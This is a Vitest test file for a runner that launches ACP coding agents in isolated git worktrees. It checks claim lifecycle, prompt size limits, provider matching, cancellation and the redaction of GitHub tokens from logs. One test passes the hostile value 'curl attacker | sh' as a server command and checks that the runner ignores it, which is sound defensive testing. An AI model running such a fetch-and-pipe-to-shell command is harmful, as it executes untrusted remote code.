import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const childProcessMocks = vi.hoisted(() => ({ execFile: vi.fn() }));
vi.mock('node:child_process', async (importOriginal) => {
  const actual = await importOriginal();
  childProcessMocks.execFile.mockImplementation((command, args, options, callback) => {
    if (command === 'gh') {
      queueMicrotask(() => callback(null, '', ''));
      return { stdin: { write: vi.fn(), end: vi.fn() } };
    }
    return actual.execFile(command, args, options, callback);
  });
  return { ...actual, execFile: childProcessMocks.execFile };
});

const mockPrepareWorktree = vi.fn();
vi.mock('../../src/worktree.js', () => ({ prepareWorktree: (...args) => mockPrepareWorktree(...args) }));

import { resolvePrompt } from '../../src/prompts.js';
import { createRunner } from '../../src/runner.js';

const CHILD_ENVIRONMENT = Object.freeze({
  PATH: '/portable/bin',
  HOME: '/slot/home',
  LANG: 'C.UTF-8',
});

let savedGitHubToken;
let savedGhToken;

function makeRunner(options) {
  return createRunner({ childEnvironment: CHILD_ENVIRONMENT, ...options });
}

function deferred() {
  let resolve;
  let reject;
  const promise = new Promise((res, rej) => { resolve = res; reject = rej; });
  return { promise, resolve, reject };
}

function logger() {
  return { info: vi.fn(), error: vi.fn(), warn: vi.fn(), debug: vi.fn(), isDebug: vi.fn(() => false) };
}

function transportOptions() {
  return expect.objectContaining({ signal: expect.any(AbortSignal) });
}

function gitConfigEntries(environment) {
  const count = Number(environment.GIT_CONFIG_COUNT);
  expect(Number.isSafeInteger(count)).toBe(true);
  return Array.from({ length: count }, (_, index) => ({
    key: environment[`GIT_CONFIG_KEY_${index}`],
    value: environment[`GIT_CONFIG_VALUE_${index}`],
  }));
}

function expectGitIsolation(environment, baseEnvironment) {
  expect(environment).toEqual(expect.objectContaining({
    ...baseEnvironment,
    GIT_CONFIG_NOSYSTEM: '1',
    GIT_CONFIG_GLOBAL: expect.any(String),
  }));
}

function expectClaimGitEnvironment(environment, baseEnvironment, githubToken) {
  expectGitIsolation(environment, baseEnvironment);
  expect(environment).toEqual(expect.objectContaining({
    GH_TOKEN: githubToken,
    GITHUB_TOKEN: githubToken,
  }));
  const extraHeader = gitConfigEntries(environment).find(
    ({ key }) => key.toLowerCase() === 'http.https://github.com/.extraheader',
  );
  expect(extraHeader).toBeDefined();
  expect(extraHeader.value).toMatch(/^Authorization: Basic /u);
  expect(Buffer.from(extraHeader.value.slice('Authorization: Basic '.length), 'base64').toString('utf8'))
    .toBe(`x-access-token:${githubToken}`);
  for (const { value } of gitConfigEntries(environment)) {
    expect(String(value)).not.toContain(githubToken);
  }
}

function client(overrides = {}) {
  return {
    register: vi.fn(async () => ({ session_id: 'runner-session', status: 'online' })),
    poll: vi.fn(async () => null),
    heartbeat: vi.fn(async () => ({ ok: true })),
    reportClaim: vi.fn(async () => ({ ok: true })),
    postClaimEvents: vi.fn(async () => ({ ok: true })),
    postClaimRequest: vi.fn(async () => ({ ok: true })),
    cancelClaimRequest: vi.fn(async () => ({ ok: true })),
    renewClaimCommand: vi.fn(async () => ({ renewed: true })),
    pollClaimCommands: vi.fn(async () => ({ commands: [] })),
    ackClaimCommand: vi.fn(async () => ({ ok: true })),
    ...overrides,
  };
}

function fakeRuntime(result = { sessionId: 'acp-session', messageId: 'message-1', stopReason: 'end_turn' }) {
  return {
    runInitialPrompt: vi.fn(async () => result),
    prompt: vi.fn(async (_text, { onAccepted } = {}) => {
      await onAccepted?.({ messageId: 'message-2' });
      return { messageId: 'message-2', stopReason: 'end_turn' };
    }),
    cancel: vi.fn(async () => ({ stopReason: 'cancelled' })),
    answerRequest: vi.fn(async () => undefined),
    close: vi.fn(async () => undefined),
    exited: Promise.resolve({ code: 0, signal: null, error: null }),
  };
}

const WORK = {
  claim_id: 42,
  claim_type: 'review_fix',
  message: 'Fix the bug',
  repo: 'org/repo',
  pr_number: 7,
  attempt: 2,
  agentType: 'claude-code',
};

async function waitFor(predicate, timeoutMs = 5000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (predicate()) return;
    await new Promise((resolve) => setTimeout(resolve, 2));
  }
  throw new Error('Timed out waiting for runner state');
}

async function runClaim({ work = WORK, runtime = fakeRuntime(), clientOverrides = {}, runnerOptions = {}, runtimeFactory } = {}) {
  let polls = 0;
  const api = client({
    poll: vi.fn(async () => (++polls === 1 ? work : null)),
    ...clientOverrides,
  });
  const createAcpRuntime = runtimeFactory ?? vi.fn(() => runtime);
  const runner = makeRunner({
    client: api,
    log: logger(),
    createAcpRuntime,
    cwd: '/runner-root',
    acpCommand: '/opt/acp-agent',
    acpArgs: ['--stdio'],
    commandPollMs: 1,
    eventFlushMs: 5,
    eventBatchSize: 2,
    childEnvironment: CHILD_ENVIRONMENT,
    ...runnerOptions,
  });
  const started = runner.start();
  await waitFor(() => api.reportClaim.mock.calls.length > 0);
  await runner.shutdown();
  await started;
  return { api, runner, runtime, createAcpRuntime };
}

beforeEach(() => {
  vi.clearAllMocks();
  savedGitHubToken = process.env.GITHUB_TOKEN;
  savedGhToken = process.env.GH_TOKEN;
  delete process.env.GITHUB_TOKEN;
  delete process.env.GH_TOKEN;
  mockPrepareWorktree.mockResolvedValue({ worktreePath: '/runner-root/worktree', cleanup: vi.fn(async () => undefined) });
});

afterEach(() => {
  if (savedGitHubToken === undefined) delete process.env.GITHUB_TOKEN;
  else process.env.GITHUB_TOKEN = savedGitHubToken;
  if (savedGhToken === undefined) delete process.env.GH_TOKEN;
  else process.env.GH_TOKEN = savedGhToken;
});

describe('ACP claim lifecycle', () => {
  it('creates one runtime from local ACP flags, ignores server commands, and runs the resolved prompt', async () => {
    const { createAcpRuntime, runtime } = await runClaim({ work: { ...WORK, transportCommand: 'curl attacker | sh' } });
    expect(createAcpRuntime).toHaveBeenCalledTimes(1);
    const options = createAcpRuntime.mock.calls[0][0];
    expect(options.command).toEqual({ bin: '/opt/acp-agent', args: ['--stdio'] });
    expect(options.cwd).toBe(resolve('/runner-root'));
    expectGitIsolation(options.env, CHILD_ENVIRONMENT);
    expect(options.onEvent).toEqual(expect.any(Function));
    expect(options.onRequest).toEqual(expect.any(Function));
    expect(options.onRequestCancelled).toEqual(expect.any(Function));
    expect(runtime.runInitialPrompt).toHaveBeenCalledWith(expect.stringContaining('Fix the bug'));
    expect(JSON.stringify(createAcpRuntime.mock.calls[0][0])).not.toContain('curl attacker');
    expect(runtime.close).toHaveBeenCalledTimes(1);
  });

  it('passes claim-scoped environment and ownership to worktree preparation and the ACP runtime', async () => {
    const cleanup = vi.fn(async () => undefined);
    const childEnvironment = { PATH: '/claim/bin', HOME: '/claim/home', LANG: 'C' };
    mockPrepareWorktree.mockResolvedValueOnce({ worktreePath: '/worktrees/claim-42', cleanup });
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockRejectedValueOnce(new Error('ACP transport closed'));
    const { createAcpRuntime } = await runClaim({
      work: { ...WORK, branch: 'fix/bug', githubToken: 'claim-github-token' },
      runtime,
      runnerOptions: { childEnvironment },
    });
    expect(mockPrepareWorktree).toHaveBeenCalledWith(expect.objectContaining({
      claimId: 42,
      environment: childEnvironment,
      githubToken: 'claim-github-token',
    }));
    expect(createAcpRuntime).toHaveBeenCalledWith(expect.objectContaining({
      cwd: resolve('/worktrees/claim-42'),
      env: expect.any(Object),
    }));
    expectClaimGitEnvironment(createAcpRuntime.mock.calls[0][0].env, childEnvironment, 'claim-github-token');
    expect(childEnvironment).toEqual({ PATH: '/claim/bin', HOME: '/claim/home', LANG: 'C' });
    expect(cleanup).toHaveBeenCalledTimes(1);
  });
  it('never mutates shared GitHub CLI authentication for a claim credential', async () => {
    await runClaim({ work: { ...WORK, githubToken: 'claim-github-token' } });
    expect(childProcessMocks.execFile.mock.calls.filter(([command, args]) => (
      command === 'gh' && args[0] === 'auth'
    ))).toEqual([]);
  });

  it('reports the runner registration session rather than the ACP session', async () => {
    const { api } = await runClaim();
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({
      claim_id: 42,
      session_id: 'runner-session',
      status: 'completed',
    }));
    expect(api.reportClaim.mock.calls[0][0].session_id).not.toBe('acp-session');
  });

  it.each([
    ['end_turn', 'completed', undefined],
    ['error', 'failed', undefined],
    ['refusal', 'failed', undefined],
    ['max_tokens', 'failed', undefined],
    ['max_turn_requests', 'failed', undefined],
    ['unknown_future_reason', 'failed', undefined],
  ])('maps stopReason %s to a terminal %s result', async (stopReason, status, failureKind) => {
    const { api } = await runClaim({ runtime: fakeRuntime({ sessionId: 'acp', messageId: 'm', stopReason }) });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status }));
    expect(api.reportClaim.mock.calls[0][0].failure_kind).toBe(failureKind);
  });

  it('maps runtime setup, transport, liveness, and recovery errors to transient failure', async () => {
    const runtimeFactory = vi.fn(() => { throw new Error('ACP runtime unavailable'); });
    const { api } = await runClaim({ runtimeFactory });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
  });

  describe('prompt size cap', () => {
    const LIMIT_BYTES = 131072;

    function workWithPromptBytes(bytes, filler = 'a') {
      const base = Buffer.byteLength(resolvePrompt({ claimType: 'review_fix', work: { ...WORK, message: 'a' } }), 'utf8') - 1;
      const fillerBytes = Buffer.byteLength(filler, 'utf8');
      const count = Math.floor((bytes - base) / fillerBytes);
      const remainder = bytes - base - count * fillerBytes;
      const work = { ...WORK, message: filler.repeat(count) + 'a'.repeat(remainder) };
      expect(Buffer.byteLength(resolvePrompt({ claimType: 'review_fix', work }), 'utf8')).toBe(bytes);
      return work;
    }

    it('runs a claim whose resolved prompt is exactly 131072 bytes', async () => {
      const { api, createAcpRuntime, runtime } = await runClaim({ work: workWithPromptBytes(LIMIT_BYTES) });
      expect(createAcpRuntime).toHaveBeenCalledTimes(1);
      expect(Buffer.byteLength(runtime.runInitialPrompt.mock.calls[0][0], 'utf8')).toBe(LIMIT_BYTES);
      expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
    });

    it('fails a claim at 131073 bytes before any worktree or runtime exists, with one terminal report', async () => {
      const log = logger();
      const work = { ...workWithPromptBytes(LIMIT_BYTES + 1), branch: 'fix/bug', githubToken: 'claim-github-token' };
      const { api, createAcpRuntime } = await runClaim({ work, runnerOptions: { log } });
      expect(mockPrepareWorktree).not.toHaveBeenCalled();
      expect(createAcpRuntime).not.toHaveBeenCalled();
      expect(api.reportClaim).toHaveBeenCalledTimes(1);
      expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({
        claim_id: 42,
        status: 'failed',
        failure_kind: 'terminal',
      }));
      expect(log.error).toHaveBeenCalledWith('Claim prompt exceeds size limit', expect.objectContaining({
        claimId: 42,
        repo: 'org/repo',
        attempt: 2,
      }));
      const serialized = JSON.stringify([log.info.mock.calls, log.warn.mock.calls, log.error.mock.calls, log.debug.mock.calls]);
      expect(serialized).not.toContain('aaaaaaaaaa');
      expect(serialized).not.toContain('Fix the bug');
      expect(serialized).not.toContain('claim-github-token');
    });

    it('measures UTF-8 bytes rather than characters', async () => {
      const multibyte = workWithPromptBytes(LIMIT_BYTES + 1, 'é');
      expect(multibyte.message.length).toBeLessThan(LIMIT_BYTES);
      const { api, createAcpRuntime } = await runClaim({ work: multibyte });
      expect(createAcpRuntime).not.toHaveBeenCalled();
      expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'terminal' }));
    });
  });

  it('logs the accepted and reported decision events with claim fields and no secrets', async () => {
    const log = logger();
    await runClaim({ work: { ...WORK, githubToken: 'claim-github-token' }, runnerOptions: { log } });
    expect(log.info).toHaveBeenCalledWith('Claim accepted', expect.objectContaining({
      event: 'claim_accepted',
      claimId: 42,
      repo: 'org/repo',
      attempt: 2,
    }));
    expect(log.info).toHaveBeenCalledWith('Claim reported', expect.objectContaining({
      event: 'claim_reported',
      claimId: 42,
      repo: 'org/repo',
      attempt: 2,
      status: 'completed',
    }));
    expect(JSON.stringify(log.info.mock.calls)).not.toContain('claim-github-token');
  });

  it('logs the slot registration decision event', async () => {
    const log = logger();
    await runClaim({ runnerOptions: { log } });
    expect(log.info).toHaveBeenCalledWith('Session registered', expect.objectContaining({
      event: 'slot_registered',
      sessionId: 'runner-session',
    }));
  });

  it('does not classify an unsolicited ACP cancelled stop as a dashboard cancellation', async () => {
    const { api } = await runClaim({ runtime: fakeRuntime({ sessionId: 'acp', messageId: 'm', stopReason: 'cancelled' }) });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
  });
  it('advertises verify support during registration', async () => {
    const { api } = await runClaim();
    expect(api.register).toHaveBeenCalledWith(expect.objectContaining({
      supported_claim_types: expect.arrayContaining(['review_fix', 'verify']),
    }));
  });

  it('runs green verification with only the explicit claim environment and without starting ACP', async () => {
    const worktreePath = mkdtempSync(join(tmpdir(), 'ff-runner-verify-green-'));
    const environmentCapturePath = join(worktreePath, 'child-environment.json');
    const childEnvironment = { PATH: '/verify/bin', HOME: '/verify/home', LANG: 'C' };
    mockPrepareWorktree.mockResolvedValueOnce({ worktreePath, cleanup: vi.fn(async () => undefined) });
    const work = {
      ...WORK,
      githubToken: 'verify-github-token',
      claim_type: 'verify',
      phase: 'green',
      green_sha: '1234567890abcdef1234567890abcdef12345678',
      verification: {
        framework: 'custom',
        command: [
          process.execPath,
          '-e',
          `require('node:fs').writeFileSync(${JSON.stringify(environmentCapturePath)}, JSON.stringify(process.env))`,
        ],
        timeouts_min: { red: 1, green: 1 },
      },
      red_record: {
        framework: 'custom',
        red_base_sha: 'abcdef1234567890abcdef1234567890abcdef12',
      },
    };

    const { api, createAcpRuntime } = await runClaim({ work, runnerOptions: { childEnvironment } });

    expect(createAcpRuntime).not.toHaveBeenCalled();
    const actualChildEnvironment = JSON.parse(readFileSync(environmentCapturePath, 'utf8'));
    expectClaimGitEnvironment(actualChildEnvironment, childEnvironment, 'verify-github-token');
    expect(mockPrepareWorktree).toHaveBeenCalledWith(expect.objectContaining({
      claimId: 42,
      environment: childEnvironment,
      githubToken: 'verify-github-token',
    }));
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({
      status: 'completed',
      verification: expect.objectContaining({
        phase: 'green',
        framework: 'custom',
        outcome: 'PASS',
      }),
    }));
  });

});

describe('verify authoring prompt cap', () => {
  it('fails an oversized verify prompt once as terminal before any worktree or runtime exists', async () => {
    const log = logger();
    const work = {
      ...WORK,
      githubToken: 'claim-github-token',
      claim_type: 'verify',
      phase: 'red',
      red_base_sha: 'a'.repeat(40),
      pr_body: 'oversized-secret-body'.repeat(8000),
      branch: 'fix/bug',
    };

    const { api, createAcpRuntime } = await runClaim({ work, runnerOptions: { log } });

    expect(mockPrepareWorktree).not.toHaveBeenCalled();
    expect(createAcpRuntime).not.toHaveBeenCalled();
    expect(api.reportClaim).toHaveBeenCalledTimes(1);
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({
      claim_id: 42,
      status: 'failed',
      failure_kind: 'terminal',
    }));
    expect(log.error).toHaveBeenCalledWith('Claim prompt exceeds size limit', expect.objectContaining({
      event: 'claim_prompt_too_large',
      claimId: 42,
      repo: 'org/repo',
      attempt: 2,
      limitBytes: 131072,
    }));
    const serialized = JSON.stringify([log.info.mock.calls, log.warn.mock.calls, log.error.mock.calls, log.debug.mock.calls]);
    expect(serialized).not.toContain('oversized-secret-body');
    expect(serialized).not.toContain('claim-github-token');
  });
});

describe('provider and adapter agreement', () => {
  const noCustomCommand = { acpCommand: undefined, acpArgs: [] };

  it.each([
    ['claude-code', 'codex'],
    ['codex', 'claude-code'],
    ['claude-agent-acp', 'codex-acp'],
  ])('fails a claim for another adapter once as terminal when the provider is %s and the claim agent is %s', async (provider, agentType) => {
    const log = logger();
    const { api, createAcpRuntime } = await runClaim({
      work: { ...WORK, agentType, branch: 'fix/bug', githubToken: 'claim-github-token' },
      runnerOptions: { ...noCustomCommand, provider, log },
    });

    expect(mockPrepareWorktree).not.toHaveBeenCalled();
    expect(createAcpRuntime).not.toHaveBeenCalled();
    expect(api.reportClaim).toHaveBeenCalledTimes(1);
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({
      claim_id: 42,
      status: 'failed',
      failure_kind: 'terminal',
    }));
    expect(log.error).toHaveBeenCalledWith('Claim agent type does not match the configured provider', expect.objectContaining({
      event: 'claim_provider_mismatch',
      claimId: 42,
      repo: 'org/repo',
      attempt: 2,
    }));
    const serialized = JSON.stringify([log.info.mock.calls, log.warn.mock.calls, log.error.mock.calls]);
    expect(serialized).not.toContain('claim-github-token');
    expect(serialized).not.toContain('codex-acp');
    expect(serialized).not.toContain('claude-agent-acp');
  });

  it('fails a verify claim for another adapter once as terminal before any worktree', async () => {
    const { api, createAcpRuntime } = await runClaim({
      work: { ...WORK, claim_type: 'verify', phase: 'red', red_base_sha: 'a'.repeat(40), agentType: 'codex' },
      runnerOptions: { ...noCustomCommand, provider: 'claude-code' },
    });

    expect(mockPrepareWorktree).not.toHaveBeenCalled();
    expect(createAcpRuntime).not.toHaveBeenCalled();
    expect(api.reportClaim).toHaveBeenCalledTimes(1);
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'terminal' }));
  });

  it.each([
    ['claude-code', 'claude-code', 'claude-agent-acp'],
    ['claude-code', 'claude-agent-acp', 'claude-agent-acp'],
    ['claude-agent-acp', 'claude-code', 'claude-agent-acp'],
    ['codex', 'codex-acp', 'codex-acp'],
    ['codex-acp', 'codex', 'codex-acp'],
  ])('runs a claim when the provider is %s and the claim agent is the alias %s', async (provider, agentType, bin) => {
    const { api, createAcpRuntime } = await runClaim({
      work: { ...WORK, agentType },
      runnerOptions: { ...noCustomCommand, provider },
    });

    expect(createAcpRuntime).toHaveBeenCalledTimes(1);
    expect(createAcpRuntime.mock.calls[0][0].command).toEqual({ bin, args: [] });
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
  });

  it('does not check the claim agent type when a custom ACP command is configured', async () => {
    const { api, createAcpRuntime } = await runClaim({
      work: { ...WORK, agentType: 'codex' },
      runnerOptions: { provider: 'claude-code', acpCommand: '/opt/acp-agent' },
    });

    expect(createAcpRuntime).toHaveBeenCalledTimes(1);
    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
  });
});

describe('runner ownership and failure', () => {
  it('rejects start when the fatal poll circuit opens without exiting the process', async () => {
    vi.useFakeTimers();
    const exit = vi.spyOn(process, 'exit').mockImplementation(() => undefined);
    const api = client({
      poll: vi.fn(async () => {
        throw new Error('control plane unavailable');
      }),
    });
    const runner = makeRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn(),
      cwd: '/repo',
      acpCommand: 'agent',
      maxPollFailures: 15,
    });
    try {
      const outcome = runner.start().then(
        (value) => ({ status: 'resolved', value }),
        (error) => ({ status: 'rejected', error }),
      );
      await vi.advanceTimersByTimeAsync(700_000);
      await expect(outcome).resolves.toMatchObject({
        status: 'rejected',
        error: expect.any(Error),
      });
      expect(exit).not.toHaveBeenCalled();
    } finally {
      await runner.shutdown();
      exit.mockRestore();
      vi.useRealTimers();
    }
  });

  it.each(['resolved', 'rejected'])(
    'releases an owned claim without a terminal report when ACP cancellation is %s',
    async (cancellationOutcome) => {
      const turn = deferred();
      const heartbeat = deferred();
      const eventDelivery = deferred();
      const order = [];
      const cleanup = vi.fn(async () => {
        order.push('cleanup');
      });
      mockPrepareWorktree.mockResolvedValueOnce({
        worktreePath: '/runner-root/worktree-42',
        cleanup,
      });
      const runtime = fakeRuntime();
      runtime.cancel.mockImplementation(async () => {
        order.push('cancel');
        if (cancellationOutcome === 'rejected') throw new Error('ACP cancellation failed');
        return { stopReason: 'cancelled' };
      });
      runtime.close.mockImplementation(async () => {
        order.push('close');
        try {
          return await runtime.cancel();
        } finally {
          turn.resolve({ sessionId: 'acp', messageId: 'message', stopReason: 'cancelled' });
        }
      });
      const api = client({
        poll: vi.fn().mockResolvedValueOnce({ ...WORK, branch: 'fix/ownership' }).mockResolvedValue(null),
        heartbeat: vi.fn(() => heartbeat.promise),
        postClaimEvents: vi.fn(async () => {
          await eventDelivery.promise;
          order.push('events-drained');
          return { ok: true };
        }),
        pollClaimCommands: vi.fn((_sessionId, _claimId, { signal }) => new Promise((resolveCommandPoll) => {
          const drain = () => {
            order.push('commands-drained');
            resolveCommandPoll({ commands: [] });
          };
          if (signal.aborted) drain();
          else signal.addEventListener('abort', drain, { once: true });
        })),
      });
      const createAcpRuntime = vi.fn((options) => {
        runtime.runInitialPrompt.mockImplementationOnce(() => {
          options.onEvent({
            sessionId: 'acp',
            update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: 'pending event' } },
          }).catch(() => undefined);
          return turn.promise;
        });
        return runtime;
      });
      const runner = makeRunner({
        client: api,
        log: logger(),
        createAcpRuntime,
        cwd: '/repo',
        acpCommand: 'agent',
        heartbeatIntervalMs: 25,
        commandPollMs: 60_000,
        eventBatchSize: 1,
      });
      const started = runner.start();
      try {
        await waitFor(() => api.heartbeat.mock.calls.length >= 1);
        await waitFor(() => api.postClaimEvents.mock.calls.length === 1);
        await waitFor(() => api.pollClaimCommands.mock.calls.length === 1);
        heartbeat.resolve({ ok: true, claim: null });
        await waitFor(() => runtime.close.mock.calls.length === 1, 500);
        expect(cleanup).not.toHaveBeenCalled();
        eventDelivery.resolve();
        await waitFor(() => cleanup.mock.calls.length === 1);
        expect(order.indexOf('commands-drained')).toBeGreaterThanOrEqual(0);
        expect(order.indexOf('events-drained')).toBeGreaterThanOrEqual(0);
        expect(order.indexOf('cleanup')).toBeGreaterThan(order.indexOf('commands-drained'));
        expect(order.indexOf('cleanup')).toBeGreaterThan(order.indexOf('events-drained'));
        expect(api.reportClaim).not.toHaveBeenCalled();
        expect(runner.activeWork).toBeNull();
      } finally {
        heartbeat.resolve({ ok: true, claim: null });
        eventDelivery.resolve();
        await runner.shutdown();
        await started.catch(() => undefined);
      }
    },
  );

  it('waits for an in-flight heartbeat before terminal reporting and honors a late ownership release', async () => {
    const turn = deferred();
    const heartbeat = deferred();
    const reportGate = deferred();
    const order = [];
    const cleanup = vi.fn(async () => {
      order.push('cleanup');
    });
    mockPrepareWorktree.mockResolvedValueOnce({
      worktreePath: '/runner-root/worktree-42',
      cleanup,
    });
    const runtime = fakeRuntime();
    runtime.runInitialPrompt.mockImplementationOnce(() => turn.promise);
    runtime.close.mockImplementationOnce(async () => {
      order.push('runtime-drained');
    });
    const api = client({
      poll: vi.fn().mockResolvedValueOnce({ ...WORK, branch: 'fix/heartbeat-race' }).mockResolvedValue(null),
      heartbeat: vi.fn(() => heartbeat.promise),
      reportClaim: vi.fn(async () => {
        order.push('report-started');
        await reportGate.promise;
        return { ok: true };
      }),
    });
    const runner = makeRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn(() => runtime),
      cwd: '/repo',
      acpCommand: 'agent',
      heartbeatIntervalMs: 5,
      commandPollMs: 5,
    });
    const started = runner.start();

    try {
      await waitFor(() => api.heartbeat.mock.calls.length > 0);
      turn.resolve({ sessionId: 'acp', messageId: 'message', stopReason: 'end_turn' });
      await waitFor(() => runtime.close.mock.calls.length === 1);
      await waitFor(() => cleanup.mock.calls.length === 1);
      await new Promise((resolvePromise) => setImmediate(resolvePromise));
      const reportsWhileHeartbeatPending = api.reportClaim.mock.calls.length;

      heartbeat.resolve({ ok: true, claim: null });
      reportGate.resolve();
      await waitFor(() => runner.activeWork === null);

      expect(reportsWhileHeartbeatPending).toBe(0);
      expect(runtime.close).toHaveBeenCalledTimes(1);
      expect(order.indexOf('runtime-drained')).toBeLessThan(order.indexOf('cleanup'));
      expect(api.reportClaim).not.toHaveBeenCalled();
      expect(runner.activeWork).toBeNull();
    } finally {
      heartbeat.resolve({ ok: true, claim: null });
      reportGate.resolve();
      await runner.shutdown();
      await started.catch(() => undefined);
    }
  });

  it.each([false, true])('aborts an active deterministic verification child when ownership is released (ignores SIGTERM: %s)', async (ignoreTerm) => {
    const worktreePath = mkdtempSync(join(tmpdir(), 'ff-runner-verify-cancel-'));
    const childStartedPath = join(worktreePath, 'child-started');
    const childAbortedPath = join(worktreePath, 'child-aborted');
    const childSignalledPath = join(worktreePath, 'child-signalled');
    const childMayExitPath = join(worktreePath, 'child-may-exit');
    const childFallbackPath = join(worktreePath, 'child-fallback');
    const heartbeat = deferred();
    let child;
    let childClosed = false;
    let cleanupAfterClose = false;
    const cleanup = vi.fn(async () => { cleanupAfterClose = childClosed; });
    mockPrepareWorktree.mockResolvedValueOnce({ worktreePath, cleanup });
    const commandScript = [
      "const fs = require('node:fs')",
      `process.once('SIGTERM', () => { fs.writeFileSync(${JSON.stringify(childSignalledPath)}, 'signalled'); ${ignoreTerm ? '' : `setInterval(() => { if (fs.existsSync(${JSON.stringify(childMayExitPath)})) { fs.writeFileSync(${JSON.stringify(childAbortedPath)}, 'aborted'); process.exit(143); } }, 5);`} })`,
      `fs.writeFileSync(${JSON.stringify(childStartedPath)}, 'started')`,
      `setTimeout(() => { fs.writeFileSync(${JSON.stringify(childFallbackPath)}, 'fallback'); process.exit(0); }, 10000)`,
    ].join(';');
    const work = {
      ...WORK,
      githubToken: 'verify-cancel-token',
      claim_type: 'verify',
      phase: 'green',
      green_sha: '1234567890abcdef1234567890abcdef12345678',
      verification: {
        framework: 'custom',
        command: [process.execPath, '-e', commandScript],
        timeouts_min: { red: 1, green: 1 },
      },
      red_record: {
        framework: 'custom',
        red_base_sha: 'abcdef1234567890abcdef1234567890abcdef12',
      },
    };
    const api = client({
      poll: vi.fn().mockResolvedValueOnce(work).mockResolvedValue(null),
      heartbeat: vi.fn(() => heartbeat.promise),
    });
    const runner = makeRunner({
      client: api,
      log: logger(),
      createAcpRuntime: vi.fn(),
      cwd: '/repo',
      acpCommand: 'agent',
      heartbeatIntervalMs: 5,
    });
    const started = runner.start();

    try {
      await waitFor(() => existsSync(childStartedPath));
      const index = childProcessMocks.execFile.mock.calls.findIndex(([bin, args]) => bin === process.execPath && args?.[1] === commandScript);
      child = childProcessMocks.execFile.mock.results[index].value;
      child.once('close', () => { childClosed = true; });
      await waitFor(() => api.heartbeat.mock.calls.length > 0);
      heartbeat.resolve({ ok: true, claim: null });
      if (process.platform !== 'win32') {
        await waitFor(() => existsSync(childSignalledPath));
        expect(cleanup).not.toHaveBeenCalled();
      }
      writeFileSync(childMayExitPath, 'exit');
      await waitFor(() => cleanup.mock.calls.length === 1, 3000);

      expect(cleanupAfterClose).toBe(true);
      expect(existsSync(childAbortedPath)).toBe(!ignoreTerm && process.platform !== 'win32');
      if (ignoreTerm && process.platform !== 'win32') expect(child.signalCode).toBe('SIGKILL');
      expect(existsSync(childFallbackPath)).toBe(false);
      expect(runner.activeWork).toBeNull();
      expect(api.reportClaim).not.toHaveBeenCalled();
    } finally {
      heartbeat.resolve({ ok: true, claim: null });
      writeFileSync(childMayExitPath, 'exit');
      if (child && child.exitCode === null && child.signalCode === null) child.kill('SIGKILL');
      await runner.shutdown();
      await started.catch(() => undefined);
      if (child && !childClosed) await new Promise((resolve) => child.once('close', resolve));
      rmSync(worktreePath, { recursive: true, force: true });
    }
  }, 10000);
});

describe('ACP events and requests', () => {
  it('normalizes raw updates with monotonic sequence, redacts secrets, batches, and flushes before reporting', async () => {
    const order = [];
    const api = client({
      postClaimEvents: vi.fn(async (_session, _claim, events) => { order.push(['events', events]); }),
      reportClaim: vi.fn(async (payload) => { order.push(['report', payload]); }),
    });
    let polls = 0;
    api.poll = vi.fn(async () => (++polls === 1 ? { ...WORK, githubToken: 'gh_secret_value' } : null));
    const runtime = fakeRuntime();
    const createAcpRuntime = vi.fn((options) => {
      runtime.runInitialPrompt.mockImplementationOnce(async () => {
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'agent_message_chunk', messageId: 'message-1', content: { type: 'text', text: 'first gh_secret_' } } });
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'agent_message_chunk', messageId: 'message-1', content: { type: 'text', text: 'value second' } } });
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'terminal_output_chunk', terminalId: 'terminal-1', data: Buffer.from('terminal gh_secret_').toString('base64') } });
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'terminal_output_chunk', terminalId: 'terminal-1', data: Buffer.from('value end').toString('base64') } });
        await options.onEvent({ sessionId: 'acp-session', update: { sessionUpdate: 'state_update', state: 'idle' } });
        return { sessionId: 'acp-session', messageId: 'm', stopReason: 'end_turn' };
      });
      return runtime;
    });
    const runner = makeRunner({ client: api, log: logger(), createAcpRuntime, cwd: '/repo', acpCommand: 'agent', eventBatchSize: 2, eventFlushMs: 60_000 });
    const started = runner.start();
    await waitFor(() => api.reportClaim.mock.calls.length === 1);
    await runner.shutdown();
    await started;
    const uploaded = api.postClaimEvents.mock.calls.flatMap((call) => call[2]);
    expect(uploaded.map((event) => event.seq)).toEqual(uploaded.map((_, index) => index + 1));
    const message = uploaded.filter((event) => event.kind === 'agent_message')
      .map((event) => event.payload.raw.content.text).join('');
    const terminal = uploaded.filter((event) => event.kind === 'terminal_output')
      .map((event) => Buffer.from(event.payload.raw.data, 'base64').toString('utf8')).join('');
    expect(message).toBe('first [REDACTED] second');
    expect(terminal).toBe('terminal [REDACTED] end');
    expect(JSON.stringify(uploaded)).not.toContain('gh_secret_value');
    expect(order.at(-1)[0]).toBe('report');
  });

  it('uploads redacted permission and elicitation requests without mutating runtime input', async () => {
    const seen = [];
